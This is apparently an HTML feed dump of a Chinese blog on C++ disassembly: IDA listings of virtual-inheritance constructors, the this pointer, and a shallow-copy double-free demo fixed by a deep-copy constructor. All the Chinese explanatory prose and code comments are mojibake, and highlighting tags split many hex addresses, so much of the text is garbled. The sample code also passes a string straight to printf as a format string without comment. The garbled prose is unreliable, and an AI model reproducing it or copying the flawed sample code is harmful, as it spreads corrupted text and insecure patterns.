class="line">.text:00000001400018B9 xor     edx, edx                        ; ç»™Sofaä¼ å…¥0,ä¸å†æ„é€ è™šåŸºç±»ï¼Œä¸Šé¢å·²ç»æ„é€ è¿‡äº†</span><br><span class="line">.text:00000001400018BB mov     rcx, [rsp+38h+sofabed_this]     ; this</span><br><span class="line">.text:00000001400018BB</span><br><span class="line">.text:00000001400018C0</span><br><span class="line">.text:00000001400018C0 loc_1400018C0:                          ; CODE XREF: .text:00000001400010DCâ†‘j</span><br><span class="line">.text:00000001400018C0 call    j_??0Sofa@@QEAA@XZ              ; Sofa::Sofa(void)</span><br><span class="line">.text:00000001400018C0</span><br><span class="line">.text:00000001400018C5 nop</span><br><span class="line">.text:00000001400018C6 ;   try &#123;</span><br><span class="line">.text:00000001400018C6 mov     rax, [rsp+38h+sofabed_this]</span><br><span class="line">.text:00000001400018CB add     rax, 18h</span><br><span class="line">.text:00000001400018CF xor     edx, edx</span><br><span class="line">.text:00000001400018D1 mov     rcx, rax                        ; this</span><br><span class="line">.text:00000001400018D4 call    j_??0Bed@@QEAA@XZ               ; Bed::Bed(void)</span><br><span class="line">.text:00000001400018D4</span><br><span class="line">.text:00000001400018D9 mov     rax, [rsp+38h+sofabed_this]     ; ä¸‹é¢å°±æ˜¯è®¾ç½®å„ä¸ªç±»çš„è™šè¡¨æŒ‡é’ˆ</span><br><span class="line">.text:00000001400018DE lea     rcx, ??_7SofaBed@@6BSofa@@@     ; const SofaBed::`vftable&#x27;&#123;for `Sofa&#x27;&#125;</span><br><span class="line">.text:00000001400018E5 mov     [rax], rcx</span><br><span class="line">.text:00000001400018E8 mov     rax, [rsp+38h+sofabed_this]</span><br><span class="line">.text:00000001400018ED lea     rcx, ??_7SofaBed@@6BBed@@@      ; const SofaBed::`vftable&#x27;&#123;for `Bed&#x27;&#125;</span><br><span class="line">.text:00000001400018F4 mov     [rax+18h], rcx</span><br><span class="line">.text:00000001400018F8 mov     rax, [rsp+38h+sofabed_this]</span><br><span class="line">.text:00000001400018FD mov     rax, [rax+8]</span><br><span class="line">.text:0000000140001901 movsxd  rax, dword ptr [rax+4]</span><br><span class="line">.text:0000000140001905 mov     rcx, [rsp+38h+sofabed_this]</span><br><span class="line">.text:000000014000190A lea     rdx, ??_7SofaBed@@6BFurniture@@@ ; const SofaBed::`vftable&#x27;&#123;for `Furniture&#x27;&#125;</span><br><span class="line">.text:0000000140001911 mov     [rcx+rax+8], rdx</span><br><span class="line">.text:0000000140001916 lea     rcx, aSofabedSofabed            ; &quot;SofaBed::SofaBed()\n&quot;</span><br><span class="line">.text:000000014000191D call    j_printf</span><br><span class="line">.text:000000014000191D</span><br><span class="line">.text:0000000140001922 mov     rax, [rsp+38h+sofabed_this]</span><br><span class="line">.text:0000000140001927 mov     dword ptr [rax+30h], 6</span><br><span class="line">.text:0000000140001927 ;   &#125; // starts at 1400018C6</span><br><span class="line">.text:000000014000192E mov     rax, [rsp+38h+sofabed_this]</span><br><span class="line">.text:0000000140001933 add     rsp, 38h</span><br><span class="line">.text:0000000140001937 retn</span><br></pre></td></tr></table></figure><h3 id="è™šç»§æ‰¿å­ç±»ä»£ç†ææ„å‡½æ•°"><a href="#è™šç»§æ‰¿å­ç±»ä»£ç†ææ„å‡½æ•°" class="headerlink" title="è™šç»§æ‰¿å­ç±»ä»£ç†ææ„å‡½æ•°"></a>è™šç»§æ‰¿å­ç±»ä»£ç†ææ„å‡½æ•°</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000001400019F</span>0 ; <span class="type">void</span> __fastcall SofaBed::`vbase destructor<span class="number">&#x27;</span>(SofaBed *this)</span><br><span class="line">.text:<span class="number">00000001400019F</span>0 ??_DSofaBed@@QEAAXXZ proc near          ; CODE XREF: SofaBed::`vbase destructor<span class="number">&#x27;</span>(<span class="type">void</span>)â†‘j</span><br><span class="line">.text:<span class="number">00000001400019F</span>0                                         ; DATA XREF: .pdata:<span class="number">000000014000B</span>060â†“o</span><br><span class="line">.text:<span class="number">00000001400019F</span>0                                         ; .pdata:<span class="number">000000014000B</span>06Câ†“o</span><br><span class="line">.text:<span class="number">00000001400019F</span>0</span><br><span class="line">.text:<span class="number">00000001400019F</span>0 sofabed_this= qword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000001400019F</span>0</span><br><span class="line">.text:<span class="number">00000001400019F</span>0 mov     [rsp+sofabed_this], rcx</span><br><span class="line">.text:<span class="number">00000001400019F</span>5 sub     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000001400019F</span>9 mov     rax, [rsp+<span class="number">28</span>h+sofabed_this]</span><br><span class="line">.text:<span class="number">00000001400019F</span>E add     rax, <span class="number">38</span>h ; <span class="string">&#x27;8&#x27;</span></span><br><span class="line">.text:<span class="number">0000000140001</span>A02 mov     rcx, rax                        ; this</span><br><span class="line">.text:<span class="number">0000000140001</span>A05 call    j_??<span class="number">1</span>SofaBed@@UEAA@XZ           ; SofaBed::~SofaBed(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">0000000140001</span>A05</span><br><span class="line">.text:<span class="number">0000000140001</span>A0A mov     rax, [rsp+<span class="number">28</span>h+sofabed_this]</span><br><span class="line">.text:<span class="number">0000000140001</span>A0F add     rax, <span class="number">38</span>h ; <span class="string">&#x27;8&#x27;</span></span><br><span class="line">.text:<span class="number">0000000140001</span>A13 mov     rcx, rax                        ; this</span><br><span class="line">.text:<span class="number">0000000140001</span>A16 call    j_??<span class="number">1F</span>urniture@@UEAA@XZ         ; Furniture::~Furniture(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">0000000140001</span>A16</span><br><span class="line">.text:<span class="number">0000000140001</span>A1B add     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0000000140001</span>A1F retn</span><br></pre></td></tr></table></figure><p>å…ˆä¾æ¬¡æ‰§è¡Œä¸¤ä¸ªçˆ¶ç±»Bedå’ŒSofaçš„ææ„å‡½æ•°ï¼Œç„¶åæ‰§è¡Œè™šåŸºç±»çš„ææ„å‡½æ•°</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><strong>C++åæ±‡ç¼–ä¸é€†å‘åˆ†ææŠ€æœ¯æ­ç§˜</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C++åæ±‡ç¼– 0x00</title>
      <link href="/2023/10/24/Cpp-disassemble/"/>
      <url>/2023/10/24/Cpp-disassemble/</url>
      
        <content type="html"><![CDATA[<h2 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><p>ä¸åšç‰¹æ®Šè¯´æ˜å‡ä¸ºvs2022 x64 releaseç‰ˆæœ¬ å…³é—­ä¼˜åŒ–ï¼Œå›ºå®šåŸºå€ï¼Œå…³é—­canary</p><p><img src="/2023/10/24/Cpp-disassemble/image-20231025163548674.png" alt="image-20231025163548674"></p><h2 id="ç±»ç‰¹æ€§"><a href="#ç±»ç‰¹æ€§" class="headerlink" title="ç±»ç‰¹æ€§"></a>ç±»ç‰¹æ€§</h2><p>æ²¡æœ‰æ•°æ®æˆå‘˜çš„ç±»æ˜¯å ä¸€ä¸ªå­—èŠ‚çš„ï¼Œä¸ºäº†å®ä¾‹åŒ–åå¯ä»¥è°ƒç”¨å‡½æ•°æˆå‘˜</p><p>ç±»çš„é™æ€æ•°æ®æˆå‘˜ä¸å±€éƒ¨é™æ€å˜é‡ç±»ä¼¼ï¼Œå­˜æ”¾çš„ä½ç½®å’Œå…¨å±€å˜é‡ä¸€è‡´ã€‚åªæ˜¯ç¼–è¯‘å™¨å¢åŠ äº†ä½œç”¨åŸŸçš„æ£€æŸ¥ï¼Œåœ¨ä½œç”¨åŸŸä¹‹å¤–ä¸å¯è§ã€‚</p><h2 id="thisæŒ‡é’ˆ"><a href="#thisæŒ‡é’ˆ" class="headerlink" title="thisæŒ‡é’ˆ"></a>thisæŒ‡é’ˆ</h2><p>thisæŒ‡é’ˆä¸­ä¿å­˜äº†æ‰€å±å¯¹è±¡çš„é¦–åœ°å€,éœ€è¦è®¿é—®ç±»æ•°æ®æˆå‘˜æ—¶é€šè¿‡rcxä¼ é€’thisæŒ‡é’ˆï¼Œé»˜è®¤è°ƒç”¨çº¦å®šç§°ä¸ºthiscall</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  <span class="type">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;        <span class="comment">//å…¬æœ‰æˆå‘˜å‡½æ•°</span></span><br><span class="line">    this-&gt;age = age;</span><br><span class="line">  &#125;</span><br><span class="line">public:</span><br><span class="line">  <span class="type">int</span> age;                <span class="comment">//å…¬æœ‰æ•°æ®æˆå‘˜</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person person;</span><br><span class="line">  person.setAge(<span class="number">5</span>);            <span class="comment">//è°ƒç”¨æˆå‘˜å‡½æ•°</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Person : %d\n&quot;</span>, person.age);    <span class="comment">//è·å–æ•°æ®æˆå‘˜</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000140001450 ; int __fastcall main(int argc, char **argv)</span><br><span class="line">.text:0000000140001450 main proc near                          ; CODE XREF: main_0â†‘j</span><br><span class="line">.text:0000000140001450                                         ; DATA XREF: .pdata:000000014000900Câ†“o</span><br><span class="line">.text:0000000140001450</span><br><span class="line">.text:0000000140001450 var_18= Person ptr -18h</span><br><span class="line">.text:0000000140001450 arg_0= dword ptr  8</span><br><span class="line">.text:0000000140001450 arg_8= qword ptr  10h</span><br><span class="line">.text:0000000140001450</span><br><span class="line">.text:0000000140001450 mov     [rsp+arg_8], rdx</span><br><span class="line">.text:0000000140001455 mov     [rsp+arg_0], ecx                ; ä¿æŠ¤å‚æ•°</span><br><span class="line">.text:0000000140001459 sub     rsp, 38h</span><br><span class="line">.text:000000014000145D mov     edx, 5                          ; å‚æ•°ä¸º5</span><br><span class="line">.text:0000000140001462 lea     rcx, [rsp+38h+var_18]           ; thisæŒ‡é’ˆæŒ‡å‘personçš„é¦–åœ°å€</span><br><span class="line">.text:0000000140001467 call    j_?setAge@Person@@QEAAXH@Z      ; Person::setAge(int)</span><br><span class="line">.text:0000000140001467</span><br><span class="line">.text:000000014000146C mov     edx, [rsp+38h+var_18.age]</span><br><span class="line">.text:0000000140001470 lea     rcx, _Format                    ; &quot;Person : %d\n&quot;</span><br><span class="line">.text:0000000140001477 call    j_printf</span><br><span class="line">.text:0000000140001477</span><br><span class="line">.text:000000014000147C xor     eax, eax</span><br><span class="line">.text:000000014000147E add     rsp, 38h</span><br><span class="line">.text:0000000140001482 retn</span><br><span class="line">.text:0000000140001482</span><br><span class="line">.text:0000000140001482 main endp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000001400013C0 ; void __fastcall Person::setAge(Person *this, int age)</span><br><span class="line">.text:00000001400013C0 ?setAge@Person@@QEAAXH@Z proc near      ; CODE XREF: Person::setAge(int)â†‘j</span><br><span class="line">.text:00000001400013C0</span><br><span class="line">.text:00000001400013C0 arg_0= qword ptr  8</span><br><span class="line">.text:00000001400013C0 arg_8= dword ptr  10h</span><br><span class="line">.text:00000001400013C0</span><br><span class="line">.text:00000001400013C0 mov     [rsp+arg_8], edx                   ;å‚æ•°ï¼š5</span><br><span class="line">.text:00000001400013C4 mov     [rsp+arg_0], rcx                ; thisæŒ‡é’ˆæŒ‡å‘personé¦–åœ°å€</span><br><span class="line">.text:00000001400013C9 mov     rax, [rsp+arg_0]                ; rax=thisæŒ‡é’ˆ</span><br><span class="line">.text:00000001400013CE mov     ecx, [rsp+arg_8]                ; rcx=5</span><br><span class="line">.text:00000001400013D2 mov     [rax], ecx                      ; this-&gt;age=5</span><br><span class="line">.text:00000001400013D4 retn</span><br></pre></td></tr></table></figure><h2 id="å¯¹è±¡ä½œä¸ºå‡½æ•°å‚æ•°"><a href="#å¯¹è±¡ä½œä¸ºå‡½æ•°å‚æ•°" class="headerlink" title="å¯¹è±¡ä½œä¸ºå‡½æ•°å‚æ•°"></a>å¯¹è±¡ä½œä¸ºå‡½æ•°å‚æ•°</h2><p>è¿›å…¥å‡½æ•°å‰é¢„å…ˆä¿ç•™å¯¹è±¡ä½¿ç”¨çš„æ ˆç©ºé—´ï¼Œç±»ä¸­æ²¡æœ‰å®šä¹‰æ‹·è´æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šå¯¹åŸå¯¹è±¡ä¸ä¸´æ—¶å¯¹è±¡ä¸­çš„å„æ•°æ®æˆå‘˜ç›´æ¥è¿›è¡Œæ•°æ®å¤åˆ¶ï¼Œå½¢æˆä¸€ä¸ªä¸´æ—¶å¯¹è±¡ï¼Œç§°ä¸ºé»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°ï¼Œè¿™ç§å¤åˆ¶æ–¹å¼å±äºæµ…æ‹·è´ï¼Œå¦‚æœç±»å¸¦æœ‰æŒ‡é’ˆå˜é‡ï¼Œå¹¶æœ‰åŠ¨æ€å†…å­˜åˆ†é…ï¼Œå®ƒå¿…é¡»æœ‰ä¸€ä¸ªæ‹·è´æ„é€ å‡½æ•°å¦åˆ™ä¼šæœ‰é—®é¢˜</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  Person() &#123;</span><br><span class="line">    name = new <span class="type">char</span>[<span class="number">32</span>];  <span class="comment">//ç”³è¯·å †ç©ºé—´ï¼Œåªè¦ä¸é‡Šæ”¾ï¼Œè¿›ç¨‹é€€å‡ºå‰å°†ä¸€ç›´å­˜åœ¨</span></span><br><span class="line">    age = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">if</span> (name != <span class="literal">NULL</span>) &#123;   <span class="comment">//å †ç©ºé—´ç”³è¯·æˆåŠŸä¸å¦</span></span><br><span class="line">      <span class="built_in">strcpy</span>(name, <span class="string">&quot;tom&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ~Person() &#123;</span><br><span class="line">    <span class="keyword">if</span> (name != <span class="literal">NULL</span>) &#123;  <span class="comment">//æ£€æŸ¥èµ„æº</span></span><br><span class="line">      delete[] name;     <span class="comment">//é‡Šæ”¾å †ç©ºé—´</span></span><br><span class="line">      name = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span>* <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> name;        <span class="comment">//è·å–æ•°æ®æˆå‘˜</span></span><br><span class="line">  &#125;</span><br><span class="line">private:</span><br><span class="line">  <span class="type">char</span>* name;          <span class="comment">//æ•°æ®æˆå‘˜å®šä¹‰ï¼Œä¿å­˜å †çš„é¦–åœ°å€</span></span><br><span class="line">  <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‚æ•°ä¸ºPersonç±»å¯¹è±¡çš„å‡½æ•°</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(Person obj)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(obj.getName());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person person;  <span class="comment">//ç±»å¯¹è±¡å®šä¹‰</span></span><br><span class="line">  show(person);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000140001650</span> var_48= dword ptr <span class="number">-48</span>h</span><br><span class="line">.text:<span class="number">0000000140001650</span> var_40= Person ptr <span class="number">-40</span>h</span><br><span class="line">.text:<span class="number">0000000140001650</span> obj= Person ptr <span class="number">-28</span>h</span><br><span class="line">.text:<span class="number">0000000140001650</span> arg_0= dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000140001650</span> arg_8= qword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0000000140001650</span></span><br><span class="line">.text:<span class="number">0000000140001650</span> ; FUNCTION CHUNK AT .text:<span class="number">0000000140005260</span> SIZE <span class="number">00000018</span> BYTES</span><br><span class="line">.text:<span class="number">0000000140001650</span></span><br><span class="line">.text:<span class="number">0000000140001650</span> ; __unwind &#123; <span class="comment">// __CxxFrameHandler4_0</span></span><br><span class="line">.text:<span class="number">0000000140001650</span> mov     [rsp+arg_8], rdx</span><br><span class="line">.text:<span class="number">0000000140001655</span> mov     [rsp+arg_0], ecx</span><br><span class="line">.text:<span class="number">0000000140001659</span> push    rsi</span><br><span class="line">.text:<span class="number">000000014000165</span>A push    rdi</span><br><span class="line">.text:<span class="number">000000014000165B</span> sub     rsp, <span class="number">58</span>h</span><br><span class="line">.text:<span class="number">000000014000165F</span> lea     rcx, [rsp+<span class="number">68</span>h+var_40]           ; this</span><br><span class="line">.text:<span class="number">0000000140001664</span> call    j_??<span class="number">0</span>Person@@QEAA@XZ            ; Person::Person(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">0000000140001664</span></span><br><span class="line">.text:<span class="number">0000000140001669</span> nop</span><br><span class="line">.text:<span class="number">000000014000166</span>A lea     rax, [rsp+<span class="number">68</span>h+obj]</span><br><span class="line">.text:<span class="number">000000014000166F</span> lea     rcx, [rsp+<span class="number">68</span>h+var_40]</span><br><span class="line">.text:<span class="number">0000000140001674</span> mov     rdi, rax</span><br><span class="line">.text:<span class="number">0000000140001677</span> mov     rsi, rcx</span><br><span class="line">.text:<span class="number">000000014000167</span>A mov     ecx, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">000000014000167F</span> rep movsb                               ; é‡‡ç”¨é»˜è®¤æ‹·è´æ„é€ å‡½æ•°åœ¨rsp+<span class="number">68</span>+objæµ…æ‹·è´ç”Ÿæˆpersonå¤åˆ¶å“ä½œä¸ºå‚æ•°</span><br><span class="line">.text:<span class="number">0000000140001681</span> lea     rcx, [rsp+<span class="number">68</span>h+obj]              ; obj</span><br><span class="line">.text:<span class="number">0000000140001686</span> call    j_?show@@YAXVPerson@@@Z         ; show(Person)</span><br><span class="line">.text:<span class="number">0000000140001686</span></span><br><span class="line">.text:<span class="number">000000014000168B</span> mov     [rsp+<span class="number">68</span>h+var_48], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000140001693</span> lea     rcx, [rsp+<span class="number">68</span>h+var_40]           ; this</span><br><span class="line">.text:<span class="number">0000000140001698</span> call    j_??<span class="number">1</span>Person@@QEAA@XZ            ; Person::~Person(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">0000000140001698</span></span><br><span class="line">.text:<span class="number">000000014000169</span>D mov     eax, [rsp+<span class="number">68</span>h+var_48]</span><br><span class="line">.text:<span class="number">00000001400016</span>A1 add     rsp, <span class="number">58</span>h</span><br><span class="line">.text:<span class="number">00000001400016</span>A5 pop     rdi</span><br><span class="line">.text:<span class="number">00000001400016</span>A6 pop     rsi</span><br><span class="line">.text:<span class="number">00000001400016</span>A7 retn</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000001400015B</span>0 ; <span class="type">void</span> __fastcall <span class="title function_">show</span><span class="params">(Person obj)</span></span><br><span class="line">.text:00000001400015B0 ?show@@YAXVPerson@@@Z proc near         ; CODE XREF: show(Person)â†‘j</span><br><span class="line">.text:<span class="number">00000001400015B</span>0                                         ; DATA XREF: .pdata:<span class="number">000000014000B</span>018â†“o</span><br><span class="line">.text:<span class="number">00000001400015B</span>0</span><br><span class="line">.text:<span class="number">00000001400015B</span>0 arg_0= qword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000001400015B</span>0</span><br><span class="line">.text:<span class="number">00000001400015B</span>0 ; FUNCTION CHUNK AT .text:<span class="number">0000000140005240</span> SIZE <span class="number">00000018</span> BYTES</span><br><span class="line">.text:<span class="number">00000001400015B</span>0</span><br><span class="line">.text:<span class="number">00000001400015B</span>0 ; __unwind &#123; <span class="comment">// __CxxFrameHandler4_0</span></span><br><span class="line">.text:<span class="number">00000001400015B</span>0 mov     [rsp+arg_0], rcx                ;ä¸´æ—¶å¯¹è±¡åœ°å€</span><br><span class="line">.text:<span class="number">00000001400015B</span>5 sub     rsp, <span class="number">28</span>h                        </span><br><span class="line">.text:<span class="number">00000001400015B</span>9 mov     rcx, [rsp+<span class="number">28</span>h+arg_0]            ; ä¸´æ—¶å¯¹è±¡åœ°å€ this</span><br><span class="line">.text:<span class="number">00000001400015B</span>E call    j_?getName@Person@@QEAAPEBDXZ   ; Person::getName(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">00000001400015B</span>E</span><br><span class="line">.text:<span class="number">00000001400015</span>C3 mov     rcx, rax                        ; _Format</span><br><span class="line">.text:<span class="number">00000001400015</span>C6 call    j_printf</span><br><span class="line">.text:<span class="number">00000001400015</span>C6</span><br><span class="line">.text:<span class="number">00000001400015</span>CB nop</span><br><span class="line">.text:<span class="number">00000001400015</span>CC mov     rcx, [rsp+<span class="number">28</span>h+arg_0]            ; this</span><br><span class="line">.text:<span class="number">00000001400015</span>D1 call    j_??<span class="number">1</span>Person@@QEAA@XZ            ; Person::~Person(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">00000001400015</span>D1</span><br><span class="line">.text:<span class="number">00000001400015</span>D6 add     rsp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">00000001400015</span>DA retn</span><br></pre></td></tr></table></figure><p>é‡‡ç”¨äº†æµ…æ‹·è´å°†åŒä¸€ä¸ªå †åœ°å€èµ‹å€¼ç»™nameï¼Œshowé‡Œè°ƒç”¨äº†ææ„é‡Šæ”¾äº†å †ï¼Œmainé‡Œçš„ä¹Ÿææ„é€ æˆdouble free crash</p><p><strong>ç¬¬ä¸€ç§è§£å†³æ–¹æ³•</strong></p><p>è®¾ç½®å¼•ç”¨è®¡æ•°,åœ¨è¿›å…¥å¤åˆ¶æ„é€ å‡½æ•°æ—¶ï¼Œè®°å½•ç±»å¯¹è±¡è¢«å¤åˆ¶å¼•ç”¨çš„æ¬¡æ•°ã€‚å½“å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œæ£€æŸ¥è¿™ä¸ªå¼•ç”¨è®¡æ•°ä¸­ä¿å­˜çš„å¼•ç”¨å¤åˆ¶æ¬¡æ•°æ˜¯å¦ä¸º0ã€‚å¦‚æœæ˜¯ï¼Œåˆ™é‡Šæ”¾ç”³è¯·çš„èµ„æºï¼Œå¦åˆ™å¼•ç”¨è®¡æ•°å‡1ã€‚</p><p><strong>ç¬¬äºŒç§è§£å†³æ–¹æ¡ˆ</strong></p><p>ä½¿ç”¨æ‹·è´æ„é€ å‡½æ•°æ·±æ‹·è´æ•°æ®</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">classname (<span class="type">const</span> classname &amp;obj) &#123;</span><br><span class="line">   <span class="comment">// æ‹·è´æ„é€ å‡½æ•°çš„ä¸»ä½“</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Person(<span class="type">const</span> Person &amp;obj) &#123;</span><br><span class="line">    this-&gt;age = obj.age;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(obj.name);</span><br><span class="line">    this-&gt;name = new <span class="type">char</span>[len + <span class="keyword">sizeof</span>(<span class="type">char</span>)];</span><br><span class="line">    <span class="built_in">strcpy</span>(this-&gt;name, obj.name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000001400016B</span>0 ; __int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">.text:00000001400016B0 main proc near                          ; CODE XREF: main_0â†‘j</span><br><span class="line">.text:<span class="number">00000001400016B</span>0                                         ; DATA XREF: .pdata:<span class="number">000000014000B</span>018â†“o</span><br><span class="line">.text:<span class="number">00000001400016B</span>0</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 var_48= dword ptr <span class="number">-48</span>h</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 var_40= qword ptr <span class="number">-40</span>h</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 var_38= Person ptr <span class="number">-38</span>h</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 obj= Person ptr <span class="number">-30</span>h</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 var_20= qword ptr <span class="number">-20</span>h</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 arg_0= dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000001400016B</span>0 arg_8= qword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">00000001400016B</span>0</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 ; FUNCTION CHUNK AT .text:<span class="number">0000000140005260</span> SIZE <span class="number">00000018</span> BYTES</span><br><span class="line">.text:<span class="number">00000001400016B</span>0</span><br><span class="line">.text:<span class="number">00000001400016B</span>0 ; __unwind &#123; <span class="comment">// __CxxFrameHandler4_0</span></span><br><span class="line">.text:<span class="number">00000001400016B</span>0 mov     [rsp+arg_8], rdx</span><br><span class="line">.text:<span class="number">00000001400016B</span>5 mov     [rsp+arg_0], ecx</span><br><span class="line">.text:<span class="number">00000001400016B</span>9 sub     rsp, <span class="number">68</span>h</span><br><span class="line">.text:<span class="number">00000001400016B</span>D lea     rcx, [rsp+<span class="number">68</span>h+obj]              ; this</span><br><span class="line">.text:<span class="number">00000001400016</span>C2 call    j_??<span class="number">0</span>Person@@QEAA@XZ            ; Person::Person(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">00000001400016</span>C2</span><br><span class="line">.text:<span class="number">00000001400016</span>C7 nop</span><br><span class="line">.text:<span class="number">00000001400016</span>C8 lea     rax, [rsp+<span class="number">68</span>h+var_20]</span><br><span class="line">.text:<span class="number">00000001400016</span>CD mov     [rsp+<span class="number">68</span>h+var_40], rax</span><br><span class="line">.text:<span class="number">00000001400016</span>D2 lea     rdx, [rsp+<span class="number">68</span>h+obj]              ; obj</span><br><span class="line">.text:<span class="number">00000001400016</span>D7 mov     rcx, [rsp+<span class="number">68</span>h+var_40]           ; this</span><br><span class="line">.text:<span class="number">00000001400016</span>DC call    j_??<span class="number">0</span>Person@@QEAA@AEBV0@@Z      ; Person::Person(Person <span class="type">const</span> &amp;)æ·±æ‹·è´ï¼Œè¿”å›æ–°å¯¹è±¡</span><br><span class="line">.text:<span class="number">00000001400016</span>DC</span><br><span class="line">.text:<span class="number">00000001400016E1</span> mov     [rsp+<span class="number">68</span>h+var_38.name], rax</span><br><span class="line">.text:<span class="number">00000001400016E6</span> mov     rcx, [rsp+<span class="number">68</span>h+var_38.name]      ; obj</span><br><span class="line">.text:<span class="number">00000001400016</span>EB call    j_?show@@YAXVPerson@@@Z         ; show(Person)</span><br><span class="line">.text:<span class="number">00000001400016</span>EB</span><br><span class="line">.text:<span class="number">00000001400016F</span>0 mov     [rsp+<span class="number">68</span>h+var_48], <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000001400016F</span>8 lea     rcx, [rsp+<span class="number">68</span>h+obj]              ; this</span><br><span class="line">.text:<span class="number">00000001400016F</span>D call    j_??<span class="number">1</span>Person@@QEAA@XZ            ; Person::~Person(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">00000001400016F</span>D</span><br><span class="line">.text:<span class="number">0000000140001702</span> mov     eax, [rsp+<span class="number">68</span>h+var_48]</span><br><span class="line">.text:<span class="number">0000000140001706</span> add     rsp, <span class="number">68</span>h</span><br><span class="line">.text:<span class="number">000000014000170</span>A retn</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000140003140</span> ; <span class="type">void</span> __fastcall <span class="title function_">Person::Person</span><span class="params">(Person *this, <span class="type">const</span> Person *obj)</span></span><br><span class="line">.text:0000000140003140 ??0Person@@QEAA@AEBV0@@Z proc near      ; CODE XREF: Person::Person(Person <span class="type">const</span> &amp;)â†‘j</span><br><span class="line">.text:<span class="number">0000000140003140</span>                                         ; DATA XREF: .pdata:<span class="number">000000014000B</span>2ACâ†“o</span><br><span class="line">.text:<span class="number">0000000140003140</span></span><br><span class="line">.text:<span class="number">0000000140003140</span> var_48= byte ptr <span class="number">-48</span>h</span><br><span class="line">.text:<span class="number">0000000140003140</span> var_44= dword ptr <span 